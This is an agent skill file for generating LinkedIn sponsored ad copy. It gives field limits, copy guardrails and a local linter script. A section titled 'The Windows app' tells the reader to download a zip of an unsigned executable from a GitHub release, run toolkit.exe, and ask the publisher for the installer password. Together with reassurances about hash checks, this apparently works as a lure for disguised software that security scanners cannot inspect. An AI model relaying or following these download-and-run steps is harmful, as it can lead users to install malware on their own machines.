---
name: linkedin-ads-copy-generator
description: Writes LinkedIn sponsored content for a named job title and company size, then lints the draft for the 70 and 150 character fields and hype words. Use when the user asks for linkedin ads copy generator, linkedin sponsored content headline, b2b linkedin ad copy. For US B2B demand generation teams and agency media buyers running LinkedIn campaigns.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# LinkedIn Ads Copy Generator

**Writes LinkedIn sponsored content for a named job title and company size, then lints the draft for the 70 and 150 character fields and hype words.** Written for US B2B demand generation teams and agency media buyers running LinkedIn campaigns.

Use this skill when someone asks for:

- linkedin ads copy generator
- linkedin sponsored content headline
- b2b linkedin ad copy
- linkedin ad character limits

---

## The job

B2B buyers write one generic paragraph for every audience, the fields overflow on mobile, and the ad never says which role it is for.

## What you get

1. Collect the target job title, company size, industry, the trigger event and the offer.
2. Write the introductory text inside 150 characters so the hook survives the mobile preview.
3. Write the headline inside 70 characters with the outcome, not the feature list.
4. Run the linter over the draft and fix every banned phrase and every missing field before it is uploaded.

Output contract:

- introductory_text - one block within the 150 character working limit, hook first
- headline - one line within the 70 character limit
- description - one line within the 70 character limit
- audience_note - the job title, company size and industry the copy assumes
- lint_report - the over-long fields and the banned phrases the linter found

## US specifics that matter

- LinkedIn single image sponsored content specs list an ad name of 255 characters, a headline of 70 characters, introductory text of 150 characters with 600 as the maximum, and a description of 70 characters for LinkedIn Audience Network placements.
- LinkedIn carousel ads take 2 to 10 cards, with a card headline of 45 characters, or 30 when the ad uses a Lead Gen Form.
- LinkedIn message ads cap the subject line at 60 characters, the message at 1,500 characters and the call to action button copy at 20 characters.
- LinkedIn audience targeting excludes sensitive categories such as age, gender, race, religion and health, so the copy has to describe the role rather than the person.

## Guardrails (hard rules)

- Never target or address a member by a protected personal attribute, and never imply the advertiser knows the member's company or role.
- Never use a customer's logo, name or result without a signed permission on file.
- Never claim a number the team cannot source, and never run a draft that still contains a banned superlative.
- Never create a campaign, Lead Gen Form or upload in the user's LinkedIn account.

## Quickstart

### 1. Fill in the brief

`templates/linkedin-ad-draft.md` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/lint_linkedin_draft.py --input linkedin-ad-draft.md --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/linkedin-ad-specs.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Field limits by format**

- Single image: ad name 255, headline 70, introductory text 150 with 600 maximum, description 70 for Audience Network.
- Carousel: 2 to 10 cards, card headline 45 characters, 30 with a Lead Gen Form.
- Message ad: subject 60, body 1,500, call to action button copy 20.

**Why the first line does the work**

- Mobile previews cut the introductory text before the See more link, so the hook has to land in the first line.
- The headline is shown under the image on every placement and is capped at 70 characters.
- One ad, one role: a copy that fits several job titles reads as if it fits none.

**Claims and targeting**

- A pipe, a revenue number or a headcount claim needs a source and a time period.
- Targeting is limited by LinkedIn's policy, so the copy describes the role and the situation.
- A customer name or logo in a draft needs written permission before it ships.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/linkedin-ad-specs.md` - LinkedIn ad field limits and B2B copy rules
- `templates/linkedin-ad-draft.md` - the brief to fill in
- `scripts/lint_linkedin_draft.py` - the working script

## Verify the bundle

```bash
python3 scripts/lint_linkedin_draft.py --input linkedin-ad-draft.md --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
